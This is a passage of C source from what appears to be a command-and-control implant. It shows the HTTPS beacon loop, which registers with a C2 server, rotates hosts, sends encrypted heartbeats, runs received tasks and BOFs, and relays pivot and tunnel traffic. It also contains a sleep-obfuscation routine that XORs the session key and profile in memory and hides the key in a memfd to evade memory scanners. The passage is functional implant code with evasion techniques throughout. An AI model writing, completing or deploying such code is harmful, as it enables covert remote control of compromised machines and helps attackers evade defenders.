                nax_apply_profile(fb, fbl);
                extern void nax_dbg_print_profile_pub(void);
                nax_dbg_print_profile_pub();
                registered = 1;
                DBG_OK("REGISTERED successfully — entering heartbeat loop");
            } else {
                DBG_ERR("REGISTER response: unexpected frame type=0x%02x (expected PROFILE)", ft);
            }
            free(plain);
        }
        if (!a->running) break;

        int hb_host_ok = 0;
        while (a->running) {
            if (!hb_host_ok) {
                https_rotate_host(a);
                https_cleanup();
                while (a->running && https_tls_connect(a) < 0) {
                    sleep(3);
                    https_rotate_host(a);
                }
                if (!a->running) break;
            }
            hb_host_ok = 0;

            /* GET with encrypted heartbeat */
            uint8_t hb_frame[256]; uint32_t hb_frame_len = sizeof(hb_frame);
            if (nax_build_heartbeat(hb_frame, &hb_frame_len) < 0) continue;

            uint32_t hb_enc_cap = hb_frame_len + NAX_AES_IV + NAX_AES_BLOCK + 32;
            uint8_t *hb_enc = (uint8_t *)malloc(hb_enc_cap);
            if (!hb_enc) continue;
            uint32_t hb_enc_len = hb_enc_cap;
            if (nax_encrypt(a->cfg.aes_key, hb_frame, hb_frame_len,
                            hb_enc, &hb_enc_len) < 0) { free(hb_enc); continue; }

            uint32_t resp_len = 0;
            DBG_SEC("HEARTBEAT");
            uint8_t *resp = https_get(a, hb_enc, hb_enc_len, &resp_len);
            DBG("→ GET %s (host=%s sleep=%ums jitter=%u%%)",
                nax_profile_get_uri(),
                a->cfg.c2_host, a->cfg.sleep_ms, a->cfg.jitter_pct);
            free(hb_enc);

            if (!resp) {
                if (resp_len == 0) {
                    DBG("GET response: EmptyResp (no tasks) — connection OK");
                    hb_host_ok = 1;
                } else {
                    DBG_ERR("GET failed — network error resp_len=%u, cleanup+reconnect", resp_len);
                    https_cleanup();
                }
            } else {
                DBG_OK("GET response: %u bytes — processing frames", resp_len);
                hb_host_ok = 1;
            }

            /* Process task frames — had_tasks only if real TASK frames were dispatched */
            int had_tasks = 0;
            if (resp && resp_len > 0) {
                had_tasks = https_handle_frames(a, resp, resp_len);
            }
            if (resp) free(resp);

            /* Check if there's pending pivot data before deciding to sleep */
            int has_pivot_data = 0;
            if (a->pivot_head) {
                NaxPivot *p = a->pivot_head;
                while (p && !has_pivot_data) {
                    struct pollfd pfd = { .fd = p->sock, .events = POLLIN };
                    if (poll(&pfd, 1, 0) > 0 && (pfd.revents & POLLIN)) {
                        has_pivot_data = 1;
                    }
                    p = p->next;
                }
            }

            /* Relay pivots — only if there is actual pending data */
            if (has_pivot_data) {
                process_pivots(a);
            }
            nax_opsec_heartbeat();
            { /* relay tunnels */
                uint8_t *tbuf = (uint8_t *)malloc(4*1024*1024);
                if (tbuf) {
                    uint32_t tl = nax_process_tunnels_ex(a, tbuf, 4*1024*1024);
                    if (tl > 0) https_send_result(a, 0, NAX_STATUS_TUNNEL, tbuf, tl);
                    free(tbuf);
                }
            }

            /* Drain completed async BOF results */
            nax_https_drain_async(a);

            if (had_tasks) {
                continue;
            }

            /* If there's pending pivot data, process it immediately without sleeping */
            if (has_pivot_data) {
                continue;
            }

            /* Apply pending profile AFTER sending all results with the OLD profile */
            {
                extern int nax_profile_apply_pending(void);
                if (nax_profile_apply_pending()) {
                    DBG("pending profile applied — next heartbeat uses new profile");
                }
            }

            /* Profile burst: skip sleep for 1s after profile_update to ensure
             * fast heartbeat cycle during profile transition */
            if (a->cfg.profile_burst_until > 0 && time(NULL) < a->cfg.profile_burst_until) {
                continue; /* skip sleep entirely */
            }
            a->cfg.profile_burst_until = 0;

            /* ── Sleep obfuscation ───────────────────────────────────────
             * Strategy: generate a random XOR key per sleep cycle, store
             * it in a memfd (kernel memory — invisible to userspace memory
             * scanners), XOR sensitive data before sleeping, then restore
             * after waking. No mprotect needed — all data stays in heap.
             *
             * Data obfuscated:
             *   a->cfg.aes_key   — AES-128 session key
             *   a->session_id    — hex session ID
             *   g_profile        — full malleable profile (via nax_profile_xor)
             */
            /* Normal sleep with jitter */
            {
                uint32_t ms = a->cfg.sleep_ms;
                if (a->cfg.jitter_pct > 0 && ms > 0) {
                    uint8_t r = 0;
                    FILE *rf = fopen("/dev/urandom", "rb");
                    if (rf) { fread(&r, 1, 1, rf); fclose(rf); }
                    uint32_t delta = (ms * a->cfg.jitter_pct / 100) * r / 255;
                    ms = (r & 1) ? ms + delta : (ms > delta ? ms - delta : 0);
                }
                if (ms > 0) {
                    DBG("sleeping %u ms (configured=%u ms jitter=%u%%)",
                        ms, a->cfg.sleep_ms, a->cfg.jitter_pct);

                    DBG("[DEBUG] === BEFORE OBFUSCATION ===");
                    DBG("[DEBUG] AES key full: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
                        a->cfg.aes_key[0], a->cfg.aes_key[1], a->cfg.aes_key[2], a->cfg.aes_key[3],
                        a->cfg.aes_key[4], a->cfg.aes_key[5], a->cfg.aes_key[6], a->cfg.aes_key[7],
                        a->cfg.aes_key[8], a->cfg.aes_key[9], a->cfg.aes_key[10], a->cfg.aes_key[11],
                        a->cfg.aes_key[12], a->cfg.aes_key[13], a->cfg.aes_key[14], a->cfg.aes_key[15]);
                    DBG("[DEBUG] Session ID: %s", a->session_id);
                    DBG("[DEBUG] Session ID hex[0..3]: %02x %02x %02x %02x",
                        a->session_id[0], a->session_id[1],
                        a->session_id[2], a->session_id[3]);

                    /* Key size covers all sensitive fields */
                    #define NAX_OBF_KEY_LEN 64u
                    uint8_t obf_key[NAX_OBF_KEY_LEN];
                    int key_fd = -1;

                    /* 1. Generate random key */
                    FILE *uf = fopen("/dev/urandom", "rb");
                    if (uf) {
                        fread(obf_key, 1, NAX_OBF_KEY_LEN, uf);
                        fclose(uf);

                        /* 2. Store key in memfd — lives in kernel, not
                         *    visible to /proc/<pid>/mem scanners */
                        key_fd = memfd_create(".", MFD_CLOEXEC);
                        if (key_fd >= 0)
                            write(key_fd, obf_key, NAX_OBF_KEY_LEN);

                        /* 3. XOR sensitive data in-place */
                        volatile uint8_t *kp = (volatile uint8_t *)a->cfg.aes_key;
                        for (uint32_t i = 0; i < NAX_AES_KEY_SIZE; i++)
                            kp[i] ^= obf_key[i % NAX_OBF_KEY_LEN];

                        volatile char *sp = (volatile char *)a->session_id;
                        for (uint32_t i = 0; i <= NAX_SID_LEN; i++)
                            ((volatile uint8_t *)sp)[i] ^=
                                obf_key[(NAX_AES_KEY_SIZE + i) % NAX_OBF_KEY_LEN];

                        extern void nax_profile_xor(const uint8_t *key, uint32_t key_len);
                        nax_profile_xor(obf_key, NAX_OBF_KEY_LEN);

                        DBG("[DEBUG] === DURING OBFUSCATION ===");
                        DBG("[DEBUG] AES key full: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
                            a->cfg.aes_key[0], a->cfg.aes_key[1], a->cfg.aes_key[2], a->cfg.aes_key[3],
                            a->cfg.aes_key[4], a->cfg.aes_key[5], a->cfg.aes_key[6], a->cfg.aes_key[7],
                            a->cfg.aes_key[8], a->cfg.aes_key[9], a->cfg.aes_key[10], a->cfg.aes_key[11],
                            a->cfg.aes_key[12], a->cfg.aes_key[13], a->cfg.aes_key[14], a->cfg.aes_key[15]);
                        DBG("[DEBUG] Session ID hex: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
                            a->session_id[0], a->session_id[1], a->session_id[2], a->session_id[3],
                            a->session_id[4], a->session_id[5], a->session_id[6], a->session_id[7],
                            a->session_id[8], a->session_id[9], a->session_id[10], a->session_id[11],
                            a->session_id[12], a->session_id[13], a->session_id[14], a->session_id[15]);
                        DBG("[DEBUG] Key stored in memfd (fd=%d)", key_fd);


                        /* Zero key from stack */
                        volatile uint8_t *zp = (volatile uint8_t *)obf_key;
                        for (uint32_t i = 0; i < NAX_OBF_KEY_LEN; i++) zp[i] = 0;
                    }

                    /* 4. Sleep */
                    struct timespec ts = { ms / 1000, (long)(ms % 1000) * 1000000L };
                    nanosleep(&ts, NULL);

                    /* 5. Restore key from memfd and decrypt data */
                    if (key_fd >= 0) {
                        uint8_t restore_key[NAX_OBF_KEY_LEN];
                        lseek(key_fd, 0, SEEK_SET);
                        read(key_fd, restore_key, NAX_OBF_KEY_LEN);
                        close(key_fd);

                        /* XOR again to restore (XOR is its own inverse) */
                        volatile uint8_t *kp = (volatile uint8_t *)a->cfg.aes_key;
                        for (uint32_t i = 0; i < NAX_AES_KEY_SIZE; i++)
                            kp[i] ^= restore_key[i % NAX_OBF_KEY_LEN];

                        volatile char *sp = (volatile char *)a->session_id;
                        for (uint32_t i = 0; i <= NAX_SID_LEN; i++)
                            ((volatile uint8_t *)sp)[i] ^=
                                restore_key[(NAX_AES_KEY_SIZE + i) % NAX_OBF_KEY_LEN];

                        extern void nax_profile_xor(const uint8_t *key, uint32_t key_len);
                        nax_profile_xor(restore_key, NAX_OBF_KEY_LEN);

                        /* Zero restore key from stack */
                        volatile uint8_t *zp = (volatile uint8_t *)restore_key;
                        for (uint32_t i = 0; i < NAX_OBF_KEY_LEN; i++) zp[i] = 0;
                    }

                    DBG("sleep done — next heartbeat cycle");
                } else {
                    DBG("sleep=0 — immediate next cycle");
                }
            }
        }

        https_cleanup();
    }

    https_cleanup();
    if (g_ssl_ctx) { SSL_CTX_free(g_ssl_ctx); g_ssl_ctx = NULL; }
}

#endif /* NAX_HTTPS_MODE */
